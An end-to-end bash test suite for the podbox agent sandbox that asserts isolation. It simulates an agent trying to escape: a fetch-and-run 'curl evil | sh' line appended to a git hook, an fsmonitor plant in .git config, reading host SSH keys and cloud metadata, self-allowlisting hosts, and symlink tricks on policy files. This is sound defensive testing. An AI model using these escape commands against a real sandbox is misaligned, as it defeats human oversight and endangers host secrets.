#!/usr/bin/env bash
# Asserts every isolation condition of a podbox sandbox against real podman.
# Exits non-zero on any escape. Env: PODBOX (binary), E2E_ALLOWED_HOST,
# E2E_EXTRA_HOST (reachable but not allowlisted by default), E2E_ATTACK_HOST
# (a host the agent tries to allowlist itself), E2E_F1_HOST (a host denied
# globally); all four must differ.
. "$(dirname "$0")/lib.sh"

ALLOWED=${E2E_ALLOWED_HOST:-registry.npmjs.org}
EXTRA=${E2E_EXTRA_HOST:-proxy.golang.org}
ATTACK=${E2E_ATTACK_HOST:-example.com}
F1HOST=${E2E_F1_HOST:-example.net}
# Each section changes the policy for its own host; a shared host would let
# one section's deny decide another's check.
if [ "$(printf '%s\n' "$ALLOWED" "$EXTRA" "$ATTACK" "$F1HOST" | sort -u | wc -l)" -ne 4 ]; then
	echo "E2E_ALLOWED_HOST, E2E_EXTRA_HOST, E2E_ATTACK_HOST and E2E_F1_HOST must differ" >&2
	exit 2
fi
NAME=e2e
UPNAME=e2e-up
MVNAME=e2e-mv
HKNAME=e2e-hooks
MKNAME=e2e-masks
URNAME=e2e-unread
WTNAME=e2e-wt
HLNAME=e2e-links
UPSTREAM_CTR=podbox-e2e-upstream
WORK=$(mktemp -d)
PROJ=$WORK/project
HOSTDIR=$WORK/host-home

cleanup() {
	[ -n "${LOOP_PID:-}" ] && kill "$LOOP_PID" 2>/dev/null
	podman rm -f -t 0 "$UPSTREAM_CTR" >/dev/null 2>&1
	pb rm "$UPNAME" >/dev/null 2>&1
	pb rm "$MVNAME" >/dev/null 2>&1
	pb rm "$HKNAME" >/dev/null 2>&1
	pb rm "$MKNAME" >/dev/null 2>&1
	pb rm "$URNAME" >/dev/null 2>&1
	pb rm "$WTNAME" >/dev/null 2>&1
	pb rm "$HLNAME" >/dev/null 2>&1
	pb rm e2e-home >/dev/null 2>&1
	pb rm "$NAME" --volumes >/dev/null 2>&1
	chmod -R u+rwx "$WORK" 2>/dev/null
	rm -rf "$WORK" "$PODBOX_HOME"
}
trap cleanup EXIT

# Fixtures: a project with secrets, a fake host ~/.ssh, a host loopback service.
mkdir -p "$PROJ/.ssh" "$PROJ/src" "$HOSTDIR/.ssh"
git init -q "$PROJ" && rm -rf "$PROJ/.git/hooks" && mkdir "$PROJ/.git/hooks"
echo 'API_KEY=leaked' >"$PROJ/.env"
echo 'key' >"$PROJ/.ssh/id_project"
printf '#!/bin/sh\necho ran >"$(git rev-parse --show-toplevel)/.hook-ran"\n' >"$PROJ/.git/hooks/pre-commit"
chmod +x "$PROJ/.git/hooks/pre-commit"
echo 'hello' >"$PROJ/src/readme.txt"
echo 'private notes' >"$PROJ/notes.txt"
echo 'notes.txt' >"$PROJ/.sandboxignore"
echo 'host-private-key' >"$HOSTDIR/.ssh/id_e2e"
LOOP_PORT=$((20000 + RANDOM % 10000))
python3 -m http.server "$LOOP_PORT" --bind 127.0.0.1 --directory "$HOSTDIR" >/dev/null 2>&1 &
LOOP_PID=$!

echo "== setup"
pb image build proxy shell >/dev/null || { echo "image build failed"; exit 1; }
pb create shell "$PROJ" --name "$NAME" >/dev/null && pb start "$NAME" >/dev/null || { echo "sandbox setup failed"; exit 1; }
check "host loopback service is up" eventually 5 curl -sf --noproxy '*' "http://127.0.0.1:$LOOP_PORT/"

refused() { attempt "$1" "curl -sf --max-time 10 $2"; [ $? -eq 1 ]; }
upstream_saw() { podman logs "$UPSTREAM_CTR" 2>/dev/null | grep -q "\"host\":\"$1\".*\"decision\":\"allow\""; }
curl_code() { sx "$1" "curl -s -o /dev/null -w '%{http_code}' --max-time 15 $2"; }
reached() { local c; c=$(curl_code "$1" "$2"); [ "$c" -ge 200 ] && [ "$c" -lt 500 ] && [ "$c" != 403 ]; }

echo "== allowed egress"
check "allowed host $ALLOWED answers through the proxy" reached "$NAME" "https://$ALLOWED/"

echo "== network escapes"
running "$NAME"
denied "direct IP egress (1.1.1.1:443)" "$NAME" "curl -sS --noproxy '*' --max-time 5 https://1.1.1.1/"
denied "direct TCP to 8.8.8.8:53" "$NAME" "timeout 5 bash -c 'exec 3<>/dev/tcp/8.8.8.8/53'"
denied "external DNS resolution" "$NAME" "getent hosts example.com"
denied "DNS name without proxy" "$NAME" "curl -sS --noproxy '*' --max-time 5 https://$ALLOWED/"
for target in "host.containers.internal" "169.254.1.2" "10.0.2.2" "127.0.0.1"; do
	denied "host loopback service via $target" "$NAME" "curl -sf --noproxy '*' --max-time 5 http://$target:$LOOP_PORT/"
done
denied "default route present" "$NAME" "awk '\$2 == \"00000000\" {found=1} END {exit !found}' /proc/net/route"
denied "host loopback through the proxy (127.0.0.1)" "$NAME" "curl -sf --max-time 5 http://127.0.0.1:$LOOP_PORT/"
denied "host service through the proxy (host.containers.internal)" "$NAME" "curl -sf --max-time 5 http://host.containers.internal:$LOOP_PORT/"
denied "cloud metadata through the proxy" "$NAME" "curl -sf --max-time 5 http://169.254.169.254/latest/meta-data/"
denied "host proxy variable inherited" "$NAME" "env | grep -iE '^(https?|no|all)_proxy=' | grep -vE '=(http://proxy:3128|localhost,127.0.0.1)\$' | grep -q ."

echo "== filesystem escapes"
running "$NAME"
denied "read host ~/.ssh ($HOSTDIR/.ssh/id_e2e)" "$NAME" "cat '$HOSTDIR/.ssh/id_e2e'"
check "project .env is empty" sx "$NAME" "[ ! -s '$PROJ/.env' ]"
check "project .ssh/ is empty" sx "$NAME" "[ -z \"\$(ls -A '$PROJ/.ssh')\" ]"
HOOK=$(sha256sum <"$PROJ/.git/hooks/pre-commit")
check "project .git/hooks/pre-commit visible" sx "$NAME" "grep -q hook-ran '$PROJ/.git/hooks/pre-commit'"
denied "agent adds a hook" "$NAME" "touch '$PROJ/.git/hooks/post-checkout'"
denied "agent writes .git/hooks/pre-commit" "$NAME" "echo 'echo pwned' >>'$PROJ/.git/hooks/pre-commit'"
denied "agent replaces .git/hooks/pre-commit" "$NAME" "printf 'echo pwned' >/tmp/h && mv -f /tmp/h '$PROJ/.git/hooks/pre-commit'"
denied "agent renames .git/hooks" "$NAME" "mv '$PROJ/.git/hooks' '$PROJ/.git/hooks-old'"
check ".git/hooks/pre-commit unchanged on the host" test "$(sha256sum <"$PROJ/.git/hooks/pre-commit")" = "$HOOK"
check "masked files intact on the host" grep -q leaked "$PROJ/.env"
check "project files readable and writable" sx "$NAME" "grep -q hello '$PROJ/src/readme.txt' && echo agent >'$PROJ/src/out.txt'"
check "agent writes are owned by the host user" test "$(stat -c %u "$PROJ/src/out.txt")" = "$(id -u)"
denied "podman or docker socket reachable" "$NAME" "find / \( -path /proc -o -path /sys \) -prune -o -type s -print 2>/dev/null | grep -q ."
denied "container engine binary available" "$NAME" "command -v podman || command -v docker"

echo "== git configuration"
running "$NAME"
GITCFG=$(sha256sum <"$PROJ/.git/config")
denied "agent sets core.hooksPath" "$NAME" "git config core.hooksPath /tmp/x"
denied "agent appends to .git/config" "$NAME" "echo '[core] fsmonitor = /tmp/x' >>'$PROJ/.git/config'"
denied "agent replaces .git/config" "$NAME" "cp '$PROJ/.git/config' /tmp/c && mv -f /tmp/c '$PROJ/.git/config'"
denied "agent renames .git to plant its own" "$NAME" "mv -f '$PROJ/.git' '$PROJ/.git-old'"
check ".git/config unchanged on the host" test "$(sha256sum <"$PROJ/.git/config")" = "$GITCFG"
check "git commit still works in the sandbox" sx "$NAME" "git add src/readme.txt && GIT_AUTHOR_NAME=a GIT_AUTHOR_EMAIL=a@e2e GIT_COMMITTER_NAME=a GIT_COMMITTER_EMAIL=a@e2e git commit -qm agent"
check "agent commit visible on the host" test "$(git -C "$PROJ" log -1 --format=%s 2>/dev/null)" = agent
check "project pre-commit hook ran for the agent's commit" test -f "$PROJ/.hook-ran"

echo "== git directory integrity"
GITENV="GIT_AUTHOR_NAME=a GIT_AUTHOR_EMAIL=a@e2e GIT_COMMITTER_NAME=a GIT_COMMITTER_EMAIL=a@e2e"
tampering() { grep -q "GIT DIRECTORY TAMPERING SUSPECTED" <<<"$1"; }
commit_quiet() { local err; err=$(sx "$NAME" "echo more >>src/readme.txt && git checkout -qb e2e-branch && $GITENV git commit -qam agent2" 2>&1 >/dev/null) || return 1; ! tampering "$err"; }
git_check_code() { pb git-check "$NAME" >/dev/null 2>&1; echo $?; }
ls_tampering() { tampering "$(pb ls 2>&1 >/dev/null)"; }
ls_json_clean() { pb ls -o json 2>/dev/null | jq -e ".[] | select(.name == \"$NAME\") | .git_integrity == null or .git_integrity.ok == true" >/dev/null; }
ls_json_flags() { pb ls -o json 2>/dev/null | jq -e ".[] | select(.name == \"$NAME\") | .git_integrity.ok == false and (.git_integrity.findings[0].path == \".git/commondir\")" >/dev/null; }
check "normal commit and branch in the sandbox print no git warning" commit_quiet
check "ls JSON reports a clean .git after a normal commit" ls_json_clean
check "git-check exits 0 after a normal commit" test "$(git_check_code)" = 0
check "agent writes .git/commondir" sx "$NAME" "echo /tmp/evil >'$PROJ/.git/commondir'"
check "ls warns about .git/commondir" ls_tampering
check "ls JSON reports git_integrity.ok false with the path" ls_json_flags
check "git-check exits 6" test "$(git_check_code)" = 6
stop_out=$(pb stop "$NAME" -o json 2>"$WORK/stop.err")
check "stop warns about .git/commondir" tampering "$(cat "$WORK/stop.err")"
check "stop JSON reports git_integrity.ok false" jqe '.git_integrity.ok == false' <<<"$stop_out"
check "stop prints the git warning once" test "$(grep -c 'GIT DIRECTORY TAMPERING SUSPECTED' "$WORK/stop.err")" = 1
check "git-check prints the git warning once" test "$(pb git-check "$NAME" 2>&1 >/dev/null | grep -c 'GIT DIRECTORY TAMPERING SUSPECTED')" = 1
rm -f "$PROJ/.git/commondir"
check "git-check --accept re-records" sh -c "'$PODBOX' git-check '$NAME' --accept >/dev/null"
check "git-check exits 0 after removal and accept" test "$(git_check_code)" = 0
check "ls JSON reports a clean .git after accept" ls_json_clean
check "start $NAME after the stop" q pb start "$NAME" -o json

echo "== worktree hook files"
HK=$WORK/hooked
git init -q "$HK" && rm -rf "$HK/.git/hooks"
mkdir -p "$HK/.husky" && echo 'npm test' >"$HK/.husky/pre-commit"
hk_check() { pb git-check "$HKNAME" -o json >"$WORK/hk.json" 2>/dev/null; echo $?; }
hk_finding() { jqe --arg p "$1" --argjson h "$2" '.git_integrity.findings | any(.path == $p and (.hook // false) == $h)' <"$WORK/hk.json"; }
create_json=$(pb create shell "$HK" --name "$HKNAME" -o json 2>"$WORK/hk.err")
check "create prints the hook info line" grep -qF ".husky/" "$WORK/hk.err"
check "create JSON carries the hook info" jqe '.info | contains(".husky/")' <<<"$create_json"
start_json=$(pb start "$HKNAME" -o json 2>"$WORK/hk.err")
check "start prints the hook info line" grep -qF ".husky/" "$WORK/hk.err"
check "start JSON carries the hook info" jqe '.action == "started" and (.info | contains(".husky/"))' <<<"$start_json"
check "launch without hook files has no info" jqe '.action == "started" and .info == null' <<<"$(pb start "$NAME" -o json 2>/dev/null)"
check "absent .git/hooks not created on the host" test ! -e "$HK/.git/hooks"
check "agent edits .husky/pre-commit" sx "$HKNAME" "echo 'curl evil | sh' >>.husky/pre-commit"
check "git-check exits 6 on the hook edit" test "$(hk_check)" = 6
check "git-check JSON names .husky/pre-commit as a hook file" hk_finding .husky/pre-commit true
check "git-check --accept re-records" q pb git-check "$HKNAME" --accept -o json
check "git-check exits 0 after accept" test "$(hk_check)" = 0
check "agent creates .git/hooks/ (absent at start)" sx "$HKNAME" "mkdir .git/hooks && printf '#!/bin/sh\n' >.git/hooks/post-commit"
check "git-check exits 6 on the created hook" test "$(hk_check)" = 6
check "git-check JSON names .git/hooks/post-commit" hk_finding .git/hooks/post-commit false
pb rm "$HKNAME" >/dev/null 2>&1

echo "== masks follow renamed parent directories"
MK=$WORK/masked
mkdir -p "$MK/config" "$MK/secret" "$MK/.docker" "$MK/.podbox"
echo 'prod-secret' >"$MK/config/prod.yaml"
echo 'data-secret' >"$MK/secret/data.txt"
echo 'docker-secret' >"$MK/.docker/config.json"
printf '/config/prod.yaml\nsecret/data.txt\n' >"$MK/.sandboxignore"
printf 'rules:\n  - host: %s\n    allow: true\n' "$ATTACK" >"$MK/.podbox/policy.yaml"
mk_json=$(pb create shell "$MK" --name "$MKNAME" -o json 2>"$WORK/mk.err")
check "create prints each imported project rule" grep -qF "allow $ATTACK" "$WORK/mk.err"
check "create prints each imported .sandboxignore pattern" grep -qF "/config/prod.yaml" "$WORK/mk.err"
check "create JSON lists the imports" jqe --arg r "allow $ATTACK" '.imported.rules == [$r] and .imported.ignore == ["/config/prod.yaml", "secret/data.txt"]' <<<"$mk_json"
check "start $MKNAME" q pb start "$MKNAME" -o json
check "masked files hidden before the rename" sx "$MKNAME" "[ ! -s config/prod.yaml ] && [ ! -s secret/data.txt ] && [ ! -s .docker/config.json ]"
check "agent renames the parents of masked files" sx "$MKNAME" "mv config config2 && mv secret s2 && mv .docker dk2"
check "stop $MKNAME" q pb stop "$MKNAME" -o json
check "start $MKNAME after the rename" sh -c "'$PODBOX' start '$MKNAME' -o json >/dev/null 2>'$WORK/mk.start'"
for mv in "config/prod.yaml -> config2/prod.yaml" "secret/data.txt -> s2/data.txt" ".docker/config.json -> dk2/config.json"; do
	check "start warns: $mv" grep -qF "$mv" "$WORK/mk.start"
done
running "$MKNAME"
check "start warning is loud" grep -q "MASKED PATHS MOVED in" "$WORK/mk.start"
for f in config2/prod.yaml s2/data.txt dk2/config.json; do
	denied "read $f after rename + stop/start" "$MKNAME" "grep -q secret $f"
done
check "renamed secrets intact on the host" grep -q prod-secret "$MK/config2/prod.yaml"
mk_reload_keeps() { pb policy reload "$MKNAME" -o json 2>/dev/null | jqe '(.masks_dropped // []) == []'; }
mk_hidden() {
	local f
	for f in config2/prod.yaml s2/data.txt; do
		attempt "$MKNAME" "grep -q secret $f"
		[ $? -eq 1 ] || return 1
	done
}
check "plain policy reload after the rename drops no mask (JSON)" mk_reload_keeps
check "restart $MKNAME after the reload" restart "$MKNAME"
check "moved files still masked after reload + stop/start" mk_hidden
: >"$MK/.sandboxignore"
check "reload without the patterns drops no moved mask (JSON)" mk_reload_keeps
check "restart $MKNAME after the second reload" restart "$MKNAME"
check "moved files still masked without their patterns" mk_hidden
pb rm "$MKNAME" >/dev/null 2>&1

echo "== unreadable or missing masked paths refuse the start"
UR=$WORK/unreadable
mkdir -p "$UR/sub/.ssh" "$UR/sub2"
echo 'ssh-secret-x' >"$UR/sub/.ssh/id_x"
echo 'ENV_SECRET_X=1' >"$UR/sub2/.env"
ur_start() { pb start "$URNAME" -o json >"$WORK/ur.json" 2>/dev/null; echo $?; }
ur_leak() { attempt "$URNAME" "chmod 755 '$UR/sub' '$UR/sub2'; cat '$UR/sub/.ssh/id_x' '$UR/sub2/.env' | grep -q SECRET"; [ $? -eq 1 ]; }
check "create and start $URNAME" up "$URNAME" "$UR"
check "agent makes the parents of masked files unreadable" sx "$URNAME" "chmod 000 '$UR/sub' '$UR/sub2'"
check "stop $URNAME" q pb stop "$URNAME" -o json
check "start refused (exit 7)" test "$(ur_start)" = 7
check "refusal JSON kind is masks" jqe '.error.kind == "masks"' <"$WORK/ur.json"
ur_none() { [ -z "$(podman ps -a -q --filter label=io.podbox.sandbox="$URNAME")" ]; }
check "refused start leaves no podbox container" ur_none
echo 'extra.txt' >>"$UR/.sandboxignore"
ur_reload() { pb policy reload "$URNAME" -o json >"$WORK/ur.reload" 2>/dev/null; echo $?; }
check "policy reload refused on the unreadable directory (exit 7)" test "$(ur_reload)" = 7
check "refused reload refused again (snapshot untouched)" test "$(ur_reload)" = 7
check "refusal names the path and the host fix" jqe --arg p "$UR/sub" '.error.message | contains($p) and contains("chmod u+rx")' <"$WORK/ur.json"
check "refused start leaves the sandbox stopped" sh -c "! '$PODBOX' exec '$URNAME' -- true </dev/null >/dev/null 2>&1"
chmod u+rx "$UR/sub" "$UR/sub2"
check "reload after the fix still shows the pattern" jqe '.ignore_added == ["extra.txt"]' <<<"$(pb policy reload "$URNAME" -o json 2>/dev/null)"
check "start works once the host restores the permissions" test "$(ur_start)" = 0
check "files still masked after the restart" ur_leak
check "stop $URNAME again" q pb stop "$URNAME" -o json
rm "$UR/sub2/.env"
check "start refused on a missing masked path (exit 7)" test "$(ur_start)" = 7
check "refusal lists the missing path" jqe '.error.kind == "masks" and (.error.message | contains("sub2/.env"))' <"$WORK/ur.json"
check "refused start on a missing path leaves no podbox container" ur_none
check "plain policy reload keeps the missing record (JSON)" jqe '.masks_missing == ["sub2/.env"] and (.masks_dropped // []) == []' <<<"$(pb policy reload "$URNAME" -o json 2>/dev/null)"
check "plain policy reload keeps the record" test "$(ur_start)" = 7
check "policy reload --forget-missing reports the dropped record" jqe '.masks_dropped == ["sub2/.env (missing)"]' <<<"$(pb policy reload "$URNAME" --forget-missing -o json 2>/dev/null)"
check "start works after --forget-missing" test "$(ur_start)" = 0
check "remaining file still masked" ur_leak
pb rm "$URNAME" >/dev/null 2>&1

echo "== hard links of masked files"
HL=$WORK/links
mkdir -p "$HL/q"
echo 'HL_SECRET_1' >"$HL/q/cred.key"
ln "$HL/q/cred.key" "$HL/q/z.txt" # sorts after the masked file
ln "$HL/q/cred.key" "$HL/q/a.txt" # sorts before it
hl_json=$(pb create shell "$HL" --name "$HLNAME" -o json 2>"$WORK/hl.err")
check "create with hard links of a masked file succeeds" jqe '.action == "created"' <<<"$hl_json"
blocked "create panics" grep -q panic "$WORK/hl.err"
hl_start() { pb start "$HLNAME" >/dev/null 2>"$WORK/hl.err"; echo $?; }
check "start with hard links exits 0" test "$(hl_start)" = 0
running "$HLNAME"
for f in q/cred.key q/z.txt q/a.txt; do
	denied "read $f (hard link of a masked file)" "$HLNAME" "grep -q HL_SECRET q/${f#q/}"
done
check "agent creates a secret and hard links to it" sx "$HLNAME" "echo HL_SECRET_2 >n.key && ln n.key n2 && ln n.key 0first"
check "stop $HLNAME" q pb stop "$HLNAME" -o json
check "start after the agent's hard links exits 0" test "$(hl_start)" = 0
running "$HLNAME"
blocked "start after the agent's hard links panics" grep -q panic "$WORK/hl.err"
for f in n.key n2 0first; do
	denied "read $f after stop/start" "$HLNAME" "grep -q HL_SECRET $f"
done
check "secrets intact on the host" grep -q HL_SECRET_2 "$HL/n2"
pb rm "$HLNAME" >/dev/null 2>&1

echo "== linked worktree git directory"
WTP=$WORK/wtmain
git init -q "$WTP" && git -C "$WTP" -c user.name=a -c user.email=a@e2e commit -q --allow-empty -m init
git -C "$WTP" worktree add -q ../wt 2>/dev/null
wt_check() { pb git-check "$WTNAME" -o json >"$WORK/wt.json" 2>/dev/null; echo $?; }
check "create and start $WTNAME" up "$WTNAME" "$WTP"
check "git-check exits 0 with a host linked worktree" test "$(wt_check)" = 0
check "agent plants a git directory and repoints the worktree commondir" sx "$WTNAME" "mkdir -p evil/objects evil/refs && echo 'ref: refs/heads/main' >evil/HEAD && printf '[core]\n\tfsmonitor = touch /tmp/pwned\n' >evil/config && echo ../../../evil >.git/worktrees/wt/commondir"
check "git-check exits 6 on the worktree commondir" test "$(wt_check)" = 6
check "git-check JSON names .git/worktrees/wt/commondir" jqe '.git_integrity.findings | any(.path == ".git/worktrees/wt/commondir")' <"$WORK/wt.json"
pb rm "$WTNAME" >/dev/null 2>&1

echo "== refused workspaces"
refused_usage() { local err; err=$("$@" 2>&1 >/dev/null); [ $? -eq 2 ] && grep -q "unsafe workspace" <<<"$err"; }
mkdir -p "$WORK/fakehome"
check "workspace containing PODBOX_HOME refused (exit 2)" refused_usage env PODBOX_HOME="$WORK/fakehome/.podbox" "$PODBOX" create shell "$WORK/fakehome" --name e2e-home
check "home directory refused (exit 2)" refused_usage pb create shell "$HOME" --name e2e-home
check "workspace inside PODBOX_HOME refused (exit 2)" refused_usage pb create shell "$PODBOX_HOME" --name e2e-home
mkdir -p "$WORK/moved"
pb create shell "$WORK/moved" --name "$MVNAME" >/dev/null 2>&1
rmdir "$WORK/moved" && ln -s "$PODBOX_HOME" "$WORK/moved"
check "start refuses a workspace now resolving to PODBOX_HOME (exit 2)" refused_usage pb start "$MVNAME"
pb rm "$MVNAME" >/dev/null 2>&1

echo "== privileges"
running "$NAME"
check "uid 1000" test "$(sx "$NAME" 'id -u')" = 1000
check "no effective capabilities" test "$(sx "$NAME" "awk '/^CapEff/ {print \$2}' /proc/self/status")" = 0000000000000000
check "no_new_privs set" test "$(sx "$NAME" "awk '/^NoNewPrivs/ {print \$2}' /proc/self/status")" = 1

echo "== ports"
port_denied() { sx "$NAME" "curl -s -o /dev/null --max-time 10 http://$ALLOWED:22/"; podman logs "podbox-$NAME-proxy" 2>&1 | grep -q "\"host\":\"$ALLOWED\",\"port\":\"22\",\"decision\":\"deny\",\"reason\":\"policy\""; }
check "allowed host on port 22 denied by podbox (decision log)" port_denied
check "port refusal names the --port fix" grep -q "podbox policy allow $NAME $ALLOWED --port 22" <<<"$(sx "$NAME" "curl -s --max-time 10 http://$ALLOWED:22/")"

echo "== allowlist and hot reload"
body=$(sx "$NAME" "curl -s --max-time 10 http://$EXTRA/")
check "non-allowlisted host gets the readable refusal" grep -q "Ask the user to run: podbox policy allow $NAME $EXTRA" <<<"$body"
denied "non-allowlisted host over TLS" "$NAME" "curl -sf --max-time 10 https://$EXTRA/"
pb policy allow "$NAME" "$EXTRA" >/dev/null
check "allowed after policy allow, without restart" eventually 5 reached "$NAME" "https://$EXTRA/"
pb policy deny "$NAME" "$EXTRA" >/dev/null
check "refused again after policy deny" eventually 5 refused "$NAME" "https://$EXTRA/"

echo "== project policy and .sandboxignore tampering"
running "$NAME"
# Asserts on the proxy's own decision log: an outer firewall may refuse hosts too.
proxy_log() { podman logs "podbox-$NAME-proxy" 2>&1 | grep "\"host\":\"$ATTACK\""; }
probe() { sx "$NAME" "curl -s -o /dev/null --max-time 10 http://$ATTACK/"; }
denied_only() { probe; proxy_log | grep -q '"decision":"deny"' && ! proxy_log | grep -q '"decision":"allow"'; }
allowed_by_project() { probe; proxy_log | grep '"decision":"allow"' | grep -q '"layer":"project"'; }
ls_project_clean() { pb ls -o json 2>/dev/null | jqe --arg n "$NAME" '.[] | select(.name == $n) | (.project_changed // []) | length == 0'; }
ls_warns() { pb ls -o json 2>/dev/null | jqe --arg n "$NAME" '.[] | select(.name == $n) | (.project_changed // []) | length > 0'; }
check ".sandboxignore pattern is masked" sx "$NAME" "[ ! -s '$PROJ/notes.txt' ]"
denied "agent edits .sandboxignore" "$NAME" "echo >'$PROJ/.sandboxignore'"
denied "agent removes .sandboxignore" "$NAME" "rm -f '$PROJ/.sandboxignore'"
check "agent writes .podbox/policy.yaml (absent at creation)" sx "$NAME" "mkdir -p '$PROJ/.podbox' && printf 'rules:\n  - host: $ATTACK\n    allow: true\n' >'$PROJ/.podbox/policy.yaml'"
: >"$PROJ/.sandboxignore" # the tampering a read-only mount prevents, done from the host
check "ls warns that project files changed" ls_warns
check "policy allow example.org" q pb policy allow "$NAME" example.org -o json
check "restart $NAME after policy allow" restart "$NAME"
check "self-allowlisted host denied after policy allow + stop/start" denied_only
check "removed .sandboxignore pattern still masked after stop/start" sx "$NAME" "[ ! -s '$PROJ/notes.txt' ]"
denied "agent edits .podbox/ once it exists" "$NAME" "echo x >>'$PROJ/.podbox/policy.yaml'"
reload_out=$(pb policy reload "$NAME" -o json 2>/dev/null)
check "policy reload shows the added rule" jqe --arg r "allow $ATTACK" '.rules_added == [$r]' <<<"$reload_out"
check "policy reload shows the removed pattern" jqe '.ignore_removed == ["notes.txt"]' <<<"$reload_out"
check "reloaded project rule applies without restart" eventually 10 allowed_by_project
rm -rf "$PROJ/.podbox" && echo 'notes.txt' >"$PROJ/.sandboxignore"
check "policy reload after restoring the project files" q pb policy reload "$NAME" -o json
check "ls JSON reports no project change after reload" ls_project_clean

echo "== project policy reached through an agent symlink (F1)"
# The agent links .podbox to the podbox config directory; policy allow
# --scope project must not write through it (the global deny stays a deny).
GLOBAL=$PODBOX_HOME/config/policy.yaml
mkdir -p "$PODBOX_HOME/config"
printf 'rules:\n  - host: %s\n    allow: false\n' "$F1HOST" >"$GLOBAL"
GLOBAL_SUM=$(sha256sum <"$GLOBAL")
CONFIG_LS=$(ls -A "$PODBOX_HOME/config")
check "restart $NAME with the global deny" restart "$NAME"
check "agent links .podbox to the podbox config directory" sx "$NAME" "ln -s '$PODBOX_HOME/config' '$PROJ/.podbox'"
f1_refused() { local err; err=$(pb policy allow "$NAME" "$F1HOST" --scope project 2>&1 >/dev/null); [ $? -eq 2 ] && grep -q "symbolic link" <<<"$err"; }
check "policy allow --scope project through the link refused (exit 2)" f1_refused
check "global policy.yaml unchanged" test "$(sha256sum <"$GLOBAL")" = "$GLOBAL_SUM"
check "no file written in the podbox config directory" test "$(ls -A "$PODBOX_HOME/config")" = "$CONFIG_LS"
f1_log() { podman logs "podbox-$NAME-proxy" 2>&1 | grep "\"host\":\"$F1HOST\""; }
f1_global_deny() { sx "$NAME" "curl -s -o /dev/null --max-time 10 http://$F1HOST/"; f1_log | grep '"decision":"deny"' | grep -q '"layer":"global"' && ! f1_log | grep -q '"decision":"allow"'; }
check "global deny still decides" eventually 10 f1_global_deny
rm -f "$PROJ/.podbox" "$GLOBAL"
check "policy reload after removing the link" q pb policy reload "$NAME" -o json

echo "== corporate upstream proxy (allow-all, basic auth)"
PROXY_IMG=$(pb image ls -o json | jq -r '[.[] | select(.image == "proxy")][0].ref')
HOST_UPSTREAM=${HTTPS_PROXY:-${https_proxy:-}}
podman run -d --name "$UPSTREAM_CTR" --network podbox-egress --http-proxy=false \
	-e PODBOX_PROXY_AUTH=e2e:s3cret ${HOST_UPSTREAM:+-e PODBOX_UPSTREAM_PROXY=$HOST_UPSTREAM} \
	"$PROXY_IMG" --listen :3128 --allow-all >/dev/null
mkdir -p "$PODBOX_HOME/config"
printf 'upstream_proxy: http://e2e:s3cret@%s:3128\n' "$UPSTREAM_CTR" >"$PODBOX_HOME/config/config.yaml"
check "create and start $UPNAME" up "$UPNAME" "$PROJ"
check "allowed host answers through the upstream" reached "$UPNAME" "https://$ALLOWED/"
check "upstream saw the request" eventually 5 upstream_saw "$ALLOWED"
check "refusal unchanged behind the upstream" grep -q "podbox policy allow $UPNAME $EXTRA" <<<"$(sx "$UPNAME" "curl -s --max-time 10 http://$EXTRA/")"
denied "agent sees upstream credentials" "$UPNAME" "env | grep -q s3cret"
denied "agent reaches the upstream directly" "$UPNAME" "curl -sf --noproxy '*' --max-time 5 -x http://e2e:s3cret@$UPSTREAM_CTR:3128 https://$ALLOWED/"
pb rm "$UPNAME" >/dev/null
podman rm -f -t 0 "$UPSTREAM_CTR" >/dev/null

echo "== teardown"
check "rm --volumes" pb rm "$NAME" --volumes
check "no labelled podman object left" no_objects_left
check "home volume removed" sh -c "! podman volume exists podbox-home-shell"

summary
